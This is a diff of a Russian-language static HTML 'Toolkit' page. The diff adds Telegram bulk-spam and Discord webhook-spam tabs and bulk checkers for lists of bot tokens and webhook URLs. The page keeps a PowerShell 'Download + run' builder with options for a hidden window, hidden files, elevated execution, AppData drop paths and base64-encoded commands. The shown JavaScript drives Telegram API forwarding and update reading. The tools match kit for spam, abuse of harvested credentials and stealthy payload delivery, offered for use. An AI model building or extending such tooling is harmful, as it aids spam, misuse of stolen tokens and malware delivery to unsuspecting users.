@@ -4,177 +4,322 @@
 <meta charset="UTF-8">
 <meta name="viewport" content="width=device-width, initial-scale=1">
 <title>Toolkit</title>
-<meta name="description" content="TG tools, PowerShell builder, encode/decode">
+<link href="https://fonts.googleapis.com/css2?family=Press+Start+2P&family=IBM+Plex+Mono:wght@400;500;600&display=swap" rel="stylesheet">
 <style>
 :root {
-  --bg: #0b0d12;
-  --panel: #12151c;
-  --panel2: #181c26;
-  --line: #2a3140;
-  --text: #e8eaef;
-  --muted: #8b93a7;
-  --accent: #6ea8ff;
-  --accent2: #a78bfa;
-  --ok: #4ade80;
-  --warn: #fbbf24;
-  --err: #f87171;
-  --radius: 12px;
-  --font: "Segoe UI", system-ui, -apple-system, sans-serif;
-  --mono: ui-monospace, "Cascadia Code", "JetBrains Mono", Consolas, monospace;
+  --bg: #f3eef8;
+  --grid: #e4dcf0;
+  --card: #ffffff;
+  --ink: #1a1228;
+  --muted: #6b5f7a;
+  --line: #1a1228;
+  --yellow: #f5e6a8;
+  --purple: #c9a0dc;
+  --pink: #f0b8d0;
+  --green: #a8e0b8;
+  --red: #f0a0a0;
+  --ok: #2d8a4e;
+  --err: #c23030;
+  --info: #6b5f7a;
+  --shadow: 4px 4px 0 #1a1228;
+  --radius: 4px;
+  --font: "IBM Plex Mono", ui-monospace, monospace;
+  --pixel: "Press Start 2P", monospace;
 }
 * { box-sizing: border-box; margin: 0; padding: 0; }
 body {
   font-family: var(--font);
   background: var(--bg);
-  color: var(--text);
-  min-height: 100vh;
   background-image:
-    radial-gradient(900px 400px at 10% -10%, rgba(110,168,255,.12), transparent 55%),
-    radial-gradient(700px 360px at 90% 0%, rgba(167,139,250,.10), transparent 50%);
+    linear-gradient(var(--grid) 1px, transparent 1px),
+    linear-gradient(90deg, var(--grid) 1px, transparent 1px);
+  background-size: 24px 24px;
+  color: var(--ink);
+  min-height: 100vh;
+  font-size: 13px;
+  line-height: 1.45;
 }
-a { color: var(--accent); }
-.wrap { max-width: 980px; margin: 0 auto; padding: 28px 18px 64px; }
-header { margin-bottom: 22px; }
+a { color: #6b3fa0; }
+.wrap { max-width: 980px; margin: 0 auto; padding: 28px 16px 64px; }
+header { margin-bottom: 20px; }
 header h1 {
-  font-size: 1.55rem;
-  font-weight: 650;
-  letter-spacing: -0.02em;
+  font-family: var(--pixel);
+  font-size: 1.15rem;
+  letter-spacing: 0.02em;
+  text-shadow: 3px 3px 0 var(--purple);
 }
-header p { color: var(--muted); font-size: 0.92rem; margin-top: 6px; }
+header p { color: var(--muted); margin-top: 10px; font-size: 12px; }
+
 .tabs {
-  display: flex; flex-wrap: wrap; gap: 6px;
-  margin-bottom: 20px; padding: 6px;
-  background: var(--panel); border: 1px solid var(--line); border-radius: 14px;
+  display: flex; flex-wrap: wrap; gap: 8px;
+  margin-bottom: 18px; padding: 10px;
+  background: var(--card);
+  border: 3px solid var(--line);
+  box-shadow: var(--shadow);
+  border-radius: var(--radius);
 }
 .tab {
-  border: 0; background: transparent; color: var(--muted);
-  padding: 9px 14px; border-radius: 10px; cursor: pointer;
-  font: 600 12px/1 var(--font); letter-spacing: .02em;
+  border: 3px solid var(--line);
+  background: var(--card);
+  color: var(--ink);
+  padding: 10px 12px;
+  border-radius: var(--radius);
+  cursor: pointer;
+  font-family: var(--font);
+  font-weight: 600;
+  font-size: 11px;
+  box-shadow: 2px 2px 0 var(--line);
+  transition: transform .08s, box-shadow .08s;
 }
-.tab:hover { color: var(--text); background: rgba(255,255,255,.04); }
-.tab.on { color: #0b0d12; background: linear-gradient(135deg, var(--accent), var(--accent2)); }
+.tab:hover { transform: translate(-1px, -1px); box-shadow: 3px 3px 0 var(--line); }
+.tab:active { transform: translate(1px, 1px); box-shadow: 1px 1px 0 var(--line); }
+.tab.on {
+  background: var(--purple);
+  box-shadow: 2px 2px 0 var(--line);
+}
+
 .panel { display: none; }
-.panel.on { display: block; animation: fade .18s ease; }
-@keyframes fade { from { opacity: 0; transform: translateY(4px); } to { opacity: 1; transform: none; } }
+.panel.on { display: block; animation: pop .15s ease; }
+@keyframes pop {
+  from { opacity: 0; transform: translateY(4px); }
+  to { opacity: 1; transform: none; }
+}
+
 .card {
-  background: var(--panel); border: 1px solid var(--line);
-  border-radius: var(--radius); padding: 18px; margin-bottom: 14px;
+  background: var(--card);
+  border: 3px solid var(--line);
+  box-shadow: var(--shadow);
+  border-radius: var(--radius);
+  padding: 16px;
+  margin-bottom: 14px;
 }
 .card h2 {
-  font-size: 0.78rem; text-transform: uppercase; letter-spacing: .08em;
-  color: var(--muted); margin-bottom: 14px; font-weight: 650;
+  font-family: var(--pixel);
+  font-size: 0.62rem;
+  letter-spacing: 0.04em;
+  margin-bottom: 14px;
+  color: var(--ink);
 }
+
 label {
-  display: block; font-size: 0.72rem; text-transform: uppercase;
-  letter-spacing: .06em; color: var(--muted); margin-bottom: 6px; font-weight: 600;
+  display: block;
+  font-size: 10px;
+  text-transform: uppercase;
+  letter-spacing: .06em;
+  color: var(--muted);
+  margin-bottom: 6px;
+  font-weight: 600;
 }
 input[type=text], input[type=password], input[type=number], textarea, select {
-  width: 100%; background: var(--panel2); border: 1px solid var(--line);
-  border-radius: 10px; color: var(--text); padding: 11px 12px;
-  font: 13px/1.45 var(--mono); outline: none;
+  width: 100%;
+  background: #faf8fc;
+  border: 3px solid var(--line);
+  border-radius: var(--radius);
+  color: var(--ink);
+  padding: 10px 11px;
+  font: 13px/1.4 var(--font);
+  outline: none;
+  box-shadow: inset 2px 2px 0 rgba(0,0,0,.04);
 }
-input:focus, textarea:focus, select:focus { border-color: var(--accent); }
-textarea { min-height: 140px; resize: vertical; }
+input:focus, textarea:focus, select:focus {
+  background: #fff;
+  box-shadow: 0 0 0 3px var(--purple);
+}
+textarea { min-height: 120px; resize: vertical; }
+
 .row { display: grid; gap: 12px; margin-bottom: 12px; }
 .row2 { grid-template-columns: 1fr 1fr; }
 .row3 { grid-template-columns: 1fr 1fr 1fr; }
-@media (max-width: 720px) { .row2, .row3 { grid-template-columns: 1fr; } }
-.hint { font-size: 12px; color: var(--muted); margin-top: 6px; }
+@media (max-width: 720px) {
+  .row2, .row3 { grid-template-columns: 1fr; }
+}
+
+.hint { font-size: 11px; color: var(--muted); margin-top: 6px; }
+
 .btn {
-  border: 0; border-radius: 10px; padding: 12px 16px; cursor: pointer;
-  font: 650 12px/1 var(--font); letter-spacing: .04em; text-transform: uppercase;
+  border: 3px solid var(--line);
+  border-radius: var(--radius);
+  padding: 11px 14px;
+  cursor: pointer;
+  font: 600 11px/1 var(--font);
+  letter-spacing: .03em;
+  text-transform: uppercase;
+  box-shadow: 3px 3px 0 var(--line);
+  transition: transform .08s, box-shadow .08s;
 }
-.btn-primary {
-  background: linear-gradient(135deg, var(--accent), var(--accent2));
-  color: #0b0d12; width: 100%;
-}
-.btn-primary:disabled { opacity: .35; cursor: not-allowed; }
+.btn:hover { transform: translate(-1px, -1px); box-shadow: 4px 4px 0 var(--line); }
+.btn:active { transform: translate(2px, 2px); box-shadow: 1px 1px 0 var(--line); }
+.btn:disabled { opacity: .45; cursor: not-allowed; transform: none; box-shadow: 2px 2px 0 var(--line); }
+.btn-primary { background: var(--yellow); color: var(--ink); width: 100%; }
+.btn-accent { background: var(--purple); color: var(--ink); width: 100%; }
 .btn-ghost {
-  background: transparent; color: var(--muted); border: 1px solid var(--line);
-  width: 100%; margin-top: 8px;
+  background: var(--card);
+  color: var(--ink);
+  width: 100%;
+  margin-top: 8px;
 }
 .btn-sm {
-  background: var(--panel2); color: var(--text); border: 1px solid var(--line);
-  padding: 8px 12px; border-radius: 8px; font-size: 11px; cursor: pointer;
+  background: var(--yellow);
+  color: var(--ink);
+  border: 3px solid var(--line);
+  padding: 7px 11px;
+  border-radius: var(--radius);
+  font-size: 11px;
+  font-weight: 600;
+  cursor: pointer;
+  box-shadow: 2px 2px 0 var(--line);
 }
-.btn-sm:hover { border-color: var(--accent); }
+.btn-sm:hover { transform: translate(-1px, -1px); }
 .actions { display: flex; flex-wrap: wrap; gap: 8px; margin-top: 10px; }
+
 .stats {
   display: grid; grid-template-columns: repeat(4, 1fr); gap: 8px; margin: 14px 0;
 }
 @media (max-width: 640px) { .stats { grid-template-columns: 1fr 1fr; } }
 .stat {
-  background: var(--panel2); border: 1px solid var(--line); border-radius: 10px;
-  padding: 12px; text-align: center;
+  background: var(--yellow);
+  border: 3px solid var(--line);
+  border-radius: var(--radius);
+  padding: 12px;
+  text-align: center;
+  box-shadow: 2px 2px 0 var(--line);
 }
-.stat b { display: block; font-size: 1.25rem; }
-.stat span { font-size: 10px; color: var(--muted); text-transform: uppercase; letter-spacing: .06em; }
-.progress { height: 4px; background: var(--line); border-radius: 99px; overflow: hidden; margin: 10px 0 16px; }
-.progress > i { display: block; height: 100%; width: 0; background: linear-gradient(90deg, var(--accent), var(--accent2)); transition: width .25s; }
+.stat b { display: block; font-family: var(--pixel); font-size: 0.85rem; }
+.stat span { font-size: 9px; color: var(--muted); text-transform: uppercase; letter-spacing: .05em; }
+
+.progress {
+  height: 14px;
+  background: #eee8f5;
+  border: 3px solid var(--line);
+  border-radius: var(--radius);
+  overflow: hidden;
+  margin: 10px 0 16px;
+  box-shadow: inset 2px 2px 0 rgba(0,0,0,.06);
+}
+.progress > i {
+  display: block; height: 100%; width: 0;
+  background: var(--purple);
+  transition: width .25s;
+}
+
 .log {
-  background: #0a0c10; border: 1px solid var(--line); border-radius: 10px;
-  height: 180px; overflow: auto; padding: 10px 12px; font: 12px/1.6 var(--mono);
+  background: #1a1228;
+  color: #e8e0f0;
+  border: 3px solid var(--line);
+  border-radius: var(--radius);
+  height: 180px;
+  overflow: auto;
+  padding: 10px 12px;
+  font: 12px/1.6 var(--font);
+  box-shadow: inset 2px 2px 0 rgba(0,0,0,.3);
 }
-.log .ok { color: var(--ok); } .log .err { color: var(--err); } .log .info { color: var(--muted); }
-.msg-list { display: flex; flex-direction: column; gap: 6px; max-height: 420px; overflow: auto; }
+.log .ok { color: #7ddea0; }
+.log .err { color: #ff8a8a; }
+.log .info { color: #a89bb8; }
+
+.msg-list { display: flex; flex-direction: column; gap: 8px; max-height: 420px; overflow: auto; }
 .msg-item {
   display: grid; grid-template-columns: 120px 1fr auto; gap: 10px;
-  background: var(--panel2); border: 1px solid var(--line); border-radius: 10px; padding: 10px 12px;
+  background: #faf8fc;
+  border: 3px solid var(--line);
+  border-radius: var(--radius);
+  padding: 10px 12px;
+  box-shadow: 2px 2px 0 var(--line);
 }
 @media (max-width: 640px) { .msg-item { grid-template-columns: 1fr; } }
-.msg-from { font-size: 12px; color: var(--muted); }
+.msg-from { font-size: 11px; color: var(--muted); }
 .msg-body { font-size: 13px; word-break: break-word; }
 .msg-time { font-size: 11px; color: var(--muted); }
+
 .cbs { display: grid; grid-template-columns: 1fr 1fr; gap: 8px; }
 @media (max-width: 640px) { .cbs { grid-template-columns: 1fr; } }
 .cb {
   display: flex; gap: 8px; align-items: flex-start; padding: 10px;
-  background: var(--panel2); border: 1px solid var(--line); border-radius: 10px;
-  font-size: 12px; cursor: pointer;
+  background: #faf8fc;
+  border: 3px solid var(--line);
+  border-radius: var(--radius);
+  font-size: 12px;
+  cursor: pointer;
+  box-shadow: 2px 2px 0 var(--line);
 }
-.cb input { margin-top: 2px; }
+.cb input { margin-top: 2px; accent-color: #6b3fa0; }
+
 .pathbox {
-  margin-top: 10px; padding: 10px 12px; border-radius: 10px;
-  background: rgba(110,168,255,.08); border: 1px solid rgba(110,168,255,.25);
-  font: 12px/1.5 var(--mono); word-break: break-all;
+  margin-top: 10px; padding: 10px 12px;
+  border-radius: var(--radius);
+  background: var(--yellow);
+  border: 3px solid var(--line);
+  font: 12px/1.5 var(--font);
+  word-break: break-all;
+  box-shadow: 2px 2px 0 var(--line);
 }
 pre.out {
-  margin-top: 10px; padding: 12px; background: #0a0c10; border: 1px solid var(--line);
-  border-radius: 10px; font: 12px/1.55 var(--mono); white-space: pre-wrap; word-break: break-all;
+  margin-top: 10px; padding: 12px;
+  background: #1a1228; color: #e8e0f0;
+  border: 3px solid var(--line);
+  border-radius: var(--radius);
+  font: 12px/1.55 var(--font);
+  white-space: pre-wrap; word-break: break-all;
   max-height: 360px; overflow: auto;
+  box-shadow: inset 2px 2px 0 rgba(0,0,0,.3);
 }
+
 .toast {
-  position: fixed; left: 50%; bottom: 22px; transform: translateX(-50%) translateY(120%);
-  background: var(--ok); color: #052e16; padding: 10px 16px; border-radius: 999px;
-  font: 650 12px/1 var(--font); transition: transform .2s; z-index: 50;
+  position: fixed; left: 50%; bottom: 22px;
+  transform: translateX(-50%) translateY(120%);
+  background: var(--green);
+  color: var(--ink);
+  border: 3px solid var(--line);
+  padding: 10px 16px;
+  border-radius: 999px;
+  font: 600 12px/1 var(--font);
+  box-shadow: 3px 3px 0 var(--line);
+  transition: transform .2s;
+  z-index: 50;
 }
 .toast.on { transform: translateX(-50%) translateY(0); }
-footer { margin-top: 28px; color: var(--muted); font-size: 12px; }
+
+footer { margin-top: 24px; color: var(--muted); font-size: 11px; }
+.badge {
+  display: inline-block;
+  border: 2px solid var(--line);
+  background: var(--pink);
+  padding: 2px 8px;
+  font-size: 10px;
+  font-weight: 600;
+  border-radius: 3px;
+  box-shadow: 1px 1px 0 var(--line);
+}
+.status-ok { background: var(--green); }
+.status-bad { background: var(--red); }
 </style>
 </head>
 <body>
 <div class="wrap">
   <header>
-    <h1>Toolkit</h1>
-    <p>TG forward · PowerShell builder · encode/decode · keys. Static site for Vercel.</p>
+    <h1>TOOLKIT</h1>
+    <p>TG · PowerShell · codec · keys · spam · checkers</p>
   </header>
 
   <nav class="tabs" id="tabs">
-    <button class="tab on" data-tab="tg">TG Forward</button>
-    <button class="tab" data-tab="msgs">Messages</button>
-    <button class="tab" data-tab="ps">PowerShell</button>
-    <button class="tab" data-tab="codec">Encode / Decode</button>
-    <button class="tab" data-tab="keys">Keys</button>
-    <button class="tab" data-tab="psdec">PS Decode</button>
+    <button class="tab on" data-tab="tg" type="button">TG Forward</button>
+    <button class="tab" data-tab="msgs" type="button">Сообщения</button>
+    <button class="tab" data-tab="spam" type="button">TG Спам</button>
+    <button class="tab" data-tab="hook" type="button">Webhook</button>
+    <button class="tab" data-tab="check" type="button">Чекеры</button>
+    <button class="tab" data-tab="ps" type="button">PowerShell</button>
+    <button class="tab" data-tab="codec" type="button">Encode</button>
+    <button class="tab" data-tab="keys" type="button">Ключи</button>
+    <button class="tab" data-tab="psdec" type="button">PS Decode</button>
   </nav>
 
   <!-- TG Forward -->
   <section class="panel on" id="tab-tg">
     <div class="card">
-      <h2>Bot</h2>
+      <h2>Бот</h2>
       <div class="row">
         <div>
-          <label>Bot token</label>
+          <label>Токен бота</label>
           <input type="password" id="token" placeholder="123456:AA..." autocomplete="off">
           <div class="hint" id="botHint"></div>
         </div>
@@ -182,38 +327,38 @@ footer { margin-top: 28px; color: var(--muted); font-size: 12px; }
       <div class="row row2">
         <div>
           <label>From chat id</label>
-          <input type="text" id="fromChat" placeholder="-100... or @channel">
+          <input type="text" id="fromChat" placeholder="-100... или @channel">
         </div>
         <div>
           <label>To chat id</label>
-          <input type="text" id="toChat" placeholder="-100... or user id">
+          <input type="text" id="toChat" placeholder="-100... или user id">
         </div>
       </div>
       <div class="row row3">
         <div>
-          <label>Msg id from</label>
+          <label>Msg id от</label>
           <input type="number" id="msgFrom" value="1">
         </div>
         <div>
-          <label>Msg id to</label>
+          <label>Msg id до</label>
           <input type="number" id="msgTo" value="100">
         </div>
         <div>
-          <label>Delay ms</label>
+          <label>Delay мс</label>
           <input type="number" id="delay" value="350">
         </div>
       </div>
-      <button class="btn btn-primary" id="startBtn" type="button">Start forward</button>
-      <button class="btn btn-ghost" id="stopBtn" type="button" style="display:none">Stop</button>
+      <button class="btn btn-primary" id="startBtn" type="button">Старт forward</button>
+      <button class="btn btn-ghost" id="stopBtn" type="button" style="display:none">Стоп</button>
     </div>
     <div class="card" id="progressCard" style="display:none">
-      <h2 id="progressTitle">Running</h2>
+      <h2 id="progressTitle">Работает</h2>
       <div class="progress"><i id="progressFill"></i></div>
       <div class="stats">
-        <div class="stat"><b id="sCurrent">0</b><span>current id</span></div>
-        <div class="stat"><b id="sForwarded">0</b><span>forwarded</span></div>
-        <div class="stat"><b id="sSkipped">0</b><span>skipped</span></div>
-        <div class="stat"><b id="sErrors">0</b><span>errors</span></div>
+        <div class="stat"><b id="sCurrent">0</b><span>current</span></div>
+        <div class="stat"><b id="sForwarded">0</b><span>ok</span></div>
+        <div class="stat"><b id="sSkipped">0</b><span>skip</span></div>
+        <div class="stat"><b id="sErrors">0</b><span>err</span></div>
       </div>
       <div class="log" id="logBox"></div>
     </div>
@@ -222,21 +367,121 @@ footer { margin-top: 28px; color: var(--muted); font-size: 12px; }
   <!-- Messages -->
   <section class="panel" id="tab-msgs">
     <div class="card">
-      <h2>Recent updates</h2>
+      <h2>Последние updates</h2>
       <div class="actions">
-        <button class="btn-sm" type="button" id="loadMsgs">Refresh getUpdates</button>
+        <button class="btn-sm" type="button" id="loadMsgs">Обновить getUpdates</button>
         <span class="hint" id="msgsStatus"></span>
       </div>
       <div class="msg-list" id="msgList" style="margin-top:12px">
-        <div class="hint">Open this tab and press Refresh (token from TG Forward).</div>
+        <div class="hint">Токен с вкладки TG Forward → Обновить</div>
       </div>
     </div>
   </section>
 
-  <!-- PowerShell builder (Wave-style) -->
+  <!-- TG Spam -->
+  <section class="panel" id="tab-spam">
+    <div class="card">
+      <h2>Рассылка по токену</h2>
+      <div class="row">
+        <div>
+          <label>Токен бота</label>
+          <input type="password" id="spamToken" placeholder="123456:AA..." autocomplete="off">
+        </div>
+      </div>
+      <div class="row">
+        <div>
+          <label>Chat IDs (по одному в строке)</label>
+          <textarea id="spamChats" placeholder="-100123&#10;123456789"></textarea>
+        </div>
+      </div>
+      <div class="row">
+        <div>
+          <label>Текст</label>
+          <textarea id="spamText" placeholder="сообщение"></textarea>
+        </div>
+      </div>
+      <div class="row row2">
+        <div>
+          <label>Delay мс</label>
+          <input type="number" id="spamDelay" value="500">
+        </div>
+        <div>
+          <label>Parse mode</label>
+          <select id="spamParse">
+            <option value="">plain</option>
+            <option value="HTML">HTML</option>
+            <option value="Markdown">Markdown</option>
+          </select>
+        </div>
+      </div>
+      <button class="btn btn-primary" id="spamStart" type="button">Отправить</button>
+      <button class="btn btn-ghost" id="spamStop" type="button" style="display:none">Стоп</button>
+      <div class="log" id="spamLog" style="margin-top:12px;display:none"></div>
+    </div>
+  </section>
+
+  <!-- Webhook spam -->
+  <section class="panel" id="tab-hook">
+    <div class="card">
+      <h2>Webhook spam</h2>
+      <div class="row">
+        <div>
+          <label>Webhook URL (по одному в строке)</label>
+          <textarea id="hookUrls" placeholder="https://discord.com/api/webhooks/...&#10;https://..."></textarea>
+        </div>
+      </div>
+      <div class="row">
+        <div>
+          <label>JSON body / текст</label>
+          <textarea id="hookBody" placeholder='{"content":"hello"}'></textarea>
+        </div>
+      </div>
+      <div class="row row2">
+        <div>
+          <label>Delay мс</label>
+          <input type="number" id="hookDelay" value="800">
+        </div>
+        <div>
+          <label>Повторов на URL</label>
+          <input type="number" id="hookRepeat" value="1" min="1" max="50">
+        </div>
+      </div>
+      <button class="btn btn-primary" id="hookStart" type="button">Отправить</button>
+      <button class="btn btn-ghost" id="hookStop" type="button" style="display:none">Стоп</button>
+      <div class="log" id="hookLog" style="margin-top:12px;display:none"></div>
+    </div>
+  </section>
+
+  <!-- Checkers -->
+  <section class="panel" id="tab-check">
+    <div class="card">
+      <h2>Чекер токена TG</h2>
+      <div class="row">
+        <div>
+          <label>Токены (по одному в строке)</label>
+          <textarea id="chkTokens" placeholder="123456:AA..."></textarea>
+        </div>
+      </div>
+      <button class="btn btn-primary" id="chkTokenBtn" type="button">Проверить</button>
+      <div id="chkTokenOut" style="margin-top:12px"></div>
+    </div>
+    <div class="card">
+      <h2>Чекер webhook</h2>
+      <div class="row">
+        <div>
+          <label>Webhook URLs</label>
+          <textarea id="chkHooks" placeholder="https://discord.com/api/webhooks/..."></textarea>
+        </div>
+      </div>
+      <button class="btn btn-primary" id="chkHookBtn" type="button">Проверить</button>
+      <div id="chkHookOut" style="margin-top:12px"></div>
+    </div>
+  </section>
+
+  <!-- PowerShell -->
   <section class="panel" id="tab-ps">
     <div class="card">
-      <h2>Download + run builder</h2>
+      <h2>Download + run</h2>
       <div class="row">
         <div>
           <label>File URL</label>
@@ -245,58 +490,56 @@ footer { margin-top: 28px; color: var(--muted); font-size: 12px; }
       </div>
       <div class="row row2">
         <div>
-          <label>File name</label>
-          <input type="text" id="psName" placeholder="auto from URL">
+          <label>Имя файла</label>
+          <input type="text" id="psName" placeholder="из URL">
         </div>
         <div>
-          <label>Save to</label>
+          <label>Куда</label>
           <select id="psDir">
             <option value="TEMP">%TEMP%</option>
             <option value="LOCALAPPDATA">%LOCALAPPDATA%</option>
             <option value="APPDATA">%APPDATA%</option>
             <option value="DOWNLOADS">Downloads</option>
-            <option value="CUSTOM">Custom path</option>
+            <option value="CUSTOM">Свой путь</option>
           </select>
         </div>
       </div>
       <div class="row" id="psCustomWrap" style="display:none">
         <div>
-          <label>Custom path</label>
+          <label>Свой путь</label>
           <input type="text" id="psCustom" placeholder="C:\Users\Public\App">
         </div>
       </div>
       <div class="cbs" style="margin:12px 0">
         <label class="cb"><input type="checkbox" id="psHidden"> Hidden attribute</label>
         <label class="cb"><input type="checkbox" id="psSilent" checked> Hidden window</label>
-        <label class="cb"><input type="checkbox" id="psWait"> Wait for process</label>
-        <label class="cb"><input type="checkbox" id="psAdmin"> Run elevated</label>
+        <label class="cb"><input type="checkbox" id="psWait"> Wait process</label>
+        <label class="cb"><input type="checkbox" id="psAdmin"> Elevated</label>
         <label class="cb"><input type="checkbox" id="psMkdir" checked> Create folder</label>
-        <label class="cb"><input type="checkbox" id="psB64"> Base64-encoded command</label>
+        <label class="cb"><input type="checkbox" id="psB64"> Base64 -enc</label>
       </div>
       <div class="pathbox" id="psPath">path: —</div>
+      <button class="btn btn-primary" id="psBuild" type="button" style="margin-top:12px">Собрать</button>
+      <pre class="out" id="psOut">—</pre>
       <div class="actions">
-        <button class="btn-sm" type="button" data-ps-tab="compact">Compact</button>
-        <button class="btn-sm" type="button" data-ps-tab="plain">Readable</button>
-        <button class="btn-sm" type="button" data-ps-tab="b64">Base64</button>
-        <button class="btn-sm" type="button" id="psCopy">Copy</button>
+        <button class="btn-sm" type="button" id="psCopy">Копировать</button>
       </div>
-      <pre class="out" id="psOut">Paste a URL above</pre>
     </div>
   </section>
 
   <!-- Codec -->
   <section class="panel" id="tab-codec">
     <div class="card">
-      <h2>Text transforms</h2>
+      <h2>Encode / Decode</h2>
       <div class="row">
         <div>
-          <label>Input</label>
-          <textarea id="codecIn" placeholder="text or encoded data"></textarea>
+          <label>Ввод</label>
+          <textarea id="codecIn" placeholder="текст"></textarea>
         </div>
       </div>
       <div class="row row2">
         <div>
-          <label>Mode</label>
+          <label>Режим</label>
           <select id="codecMode">
             <option value="b64e">Base64 encode</option>
             <option value="b64d">Base64 decode</option>
@@ -310,13 +553,13 @@ footer { margin-top: 28px; color: var(--muted); font-size: 12px; }
         </div>
         <div style="display:flex;align-items:flex-end;gap:8px">
           <button class="btn btn-primary" type="button" id="codecRun" style="width:auto;padding:12px 20px">Run</button>
-          <button class="btn-sm" type="button" id="codecCopy">Copy out</button>
+          <button class="btn-sm" type="button" id="codecCopy">Copy</button>
           <button class="btn-sm" type="button" id="codecSwap">Swap</button>
         </div>
       </div>
       <div class="row">
         <div>
-          <label>Output</label>
+          <label>Вывод</label>
           <textarea id="codecOut" readonly></textarea>
         </div>
       </div>
@@ -326,14 +569,14 @@ footer { margin-top: 28px; color: var(--muted); font-size: 12px; }
   <!-- Keys -->
   <section class="panel" id="tab-keys">
     <div class="card">
-      <h2>Random generators</h2>
+      <h2>Генератор</h2>
       <div class="row row3">
         <div>
-          <label>Length</label>
+          <label>Длина</label>
           <input type="number" id="keyLen" value="32" min="8" max="256">
         </div>
         <div>
-          <label>Alphabet</label>
+          <label>Алфавит</label>
           <select id="keyAlpha">
             <option value="hex">Hex</option>
             <option value="alnum">Alphanumeric</option>
@@ -347,13 +590,13 @@ footer { margin-top: 28px; color: var(--muted); font-size: 12px; }
       </div>
       <div class="row">
         <div>
-          <label>Result</label>
+          <label>Результат</label>
           <input type="text" id="keyOut" readonly>
         </div>
       </div>
       <div class="actions">
         <button class="btn-sm" type="button" id="keyCopy">Copy</button>
-        <button class="btn-sm" type="button" id="keyGen5">Generate 5</button>
+        <button class="btn-sm" type="button" id="keyGen5">×5</button>
       </div>
       <pre class="out" id="keyList" style="display:none"></pre>
     </div>
@@ -362,11 +605,11 @@ footer { margin-top: 28px; color: var(--muted); font-size: 12px; }
   <!-- PS Decode -->
   <section class="panel" id="tab-psdec">
     <div class="card">
-      <h2>Decode PowerShell one-liners</h2>
-      <p class="hint" style="margin-bottom:12px">Supports -EncodedCommand / -enc base64, and nested FromBase64String snippets.</p>
+      <h2>PS Decode</h2>
+      <p class="hint" style="margin-bottom:12px">-EncodedCommand / -enc, FromBase64String</p>
       <div class="row">
         <div>
-          <label>Encoded command or full line</label>
+          <label>Команда</label>
           <textarea id="psDecIn" placeholder="powershell -enc JAB..."></textarea>
         </div>
       </div>
@@ -375,14 +618,14 @@ footer { margin-top: 28px; color: var(--muted); font-size: 12px; }
     </div>
   </section>
 
-  <footer>Static HTML · drop on Vercel as-is · no backend required for local tools. TG API calls run from your browser.</footer>
+  <footer>static · vercel · api из браузера</footer>
 </div>
-<div class="toast" id="toast">Copied</div>
+<div class="toast" id="toast">ok</div>
 
 <script>
 const $ = id => document.getElementById(id);
 const toast = (m) => {
-  const t = $('toast'); t.textContent = m || 'Copied'; t.classList.add('on');
+  const t = $('toast'); t.textContent = m || 'ok'; t.classList.add('on');
   clearTimeout(t._t); t._t = setTimeout(() => t.classList.remove('on'), 1400);
 };
 async function copyText(s) {
@@ -390,12 +633,11 @@ async function copyText(s) {
     const ta = document.createElement('textarea'); ta.value = s; document.body.appendChild(ta); ta.select();
     document.execCommand('copy'); ta.remove();
   }
-  toast('Copied');
+  toast('скопировано');
 }
 function sleep(ms) { return new Promise(r => setTimeout(r, ms)); }
 function esc(s) { return String(s).replace(/[&<>]/g, c => ({'&':'&amp;','<':'&lt;','>':'&gt;'}[c])); }
 
-/* tabs */
 document.querySelectorAll('.tab').forEach(btn => {
   btn.addEventListener('click', () => {
     document.querySelectorAll('.tab').forEach(b => b.classList.remove('on'));
@@ -446,13 +688,13 @@ $('startBtn').addEventListener('click', async () => {
   const msgFrom = parseInt($('msgFrom').value, 10);
   const msgTo = parseInt($('msgTo').value, 10);
   const delay = Math.max(80, parseInt($('delay').value, 10) || 300);
-  if (!token || !fromChat || !toChat) return alert('Fill token and chat ids');
-  if (msgFrom > msgTo) return alert('msgFrom must be <= msgTo');
+  if (!token || !fromChat || !toChat) return alert('Токен и chat id');
+  if (msgFrom > msgTo) return alert('msgFrom <= msgTo');
   stopFlag = false; forwarded = 0; skipped = 0; errors = 0;
   $('startBtn').disabled = true;
   $('stopBtn').style.display = 'block';
   $('progressCard').style.display = 'block';
-  $('progressTitle').textContent = 'Running';
+  $('progressTitle').textContent = 'Работает';
   $('logBox').innerHTML = '';
   const total = msgTo - msgFrom + 1;
   logLine('info', '—', `Range ${msgFrom}..${msgTo} (${total})`);
@@ -463,13 +705,13 @@ $('startBtn').addEventListener('click', async () => {
       const url = `https://api.telegram.org/bot${token}/forwardMessage?chat_id=${encodeURIComponent(toChat)}&from_chat_id=${encodeURIComponent(fromChat)}&message_id=${id}`;
       const res = await fetch(url);
       const data = await res.json();
-      if (data.ok) { forwarded++; logLine('ok', id, 'forwarded'); }
+      if (data.ok) { forwarded++; logLine('ok', id, 'ok'); }
       else {
         const desc = data.description || '';
         if (/not found|MESSAGE_ID_INVALID/i.test(desc)) skipped++;
         else if (/Too Many Requests/i.test(desc)) {
           const wait = (data.parameters && data.parameters.retry_after ? data.parameters.retry_after : 5) * 1000;
-          logLine('err', id, 'flood wait ' + (wait/1000) + 's');
+          logLine('err', id, 'flood ' + (wait/1000) + 's');
           await sleep(wait); id--;
         } else if (/chat not found|CHAT_NOT_FOUND|Forbidden|blocked/i.test(desc)) {
           logLine('err', id, desc); break;
@@ -480,15 +722,15 @@ $('startBtn').addEventListener('click', async () => {
     await sleep(delay);
   }
   $('progressFill').style.width = '100%';
-  $('progressTitle').textContent = stopFlag ? 'Stopped' : 'Done';
+  $('progressTitle').textContent = stopFlag ? 'Стоп' : 'Готово';
   $('startBtn').disabled = false;
   $('stopBtn').style.display = 'none';
   $('stopBtn').disabled = false;
-  $('stopBtn').textContent = 'Stop';
+  $('stopBtn').textContent = 'Стоп';
 });
 $('stopBtn').addEventListener('click', () => {
   stopFlag = true;
-  $('stopBtn').textContent = 'Stopping...';
+  $('stopBtn').textContent = '...';
   $('stopBtn').disabled = true;
 });
 
@@ -496,15 +738,15 @@ $('stopBtn').addEventListener('click', () => {
 $('loadMsgs').addEventListener('click', async () => {
   const token = $('token').value.trim();
   const list = $('msgList');
-  if (!token) { list.innerHTML = '<div class="hint">Set token on TG Forward tab</div>'; return; }
-  $('msgsStatus').textContent = 'loading...';
+  if (!token) { list.innerHTML = '<div class="hint">токен на TG Forward</div>'; return; }
+  $('msgsStatus').textContent = '...';
   try {
     const r = await fetch(`https://api.telegram.org/bot${token}/getUpdates?limit=50&timeout=0`);
     const data = await r.json();
     if (!data.ok) { list.innerHTML = `<div class="hint">${esc(data.description||'error')}</div>`; return; }
     const updates = data.result.filter(u => u.message || u.edited_message || u.channel_post).reverse();
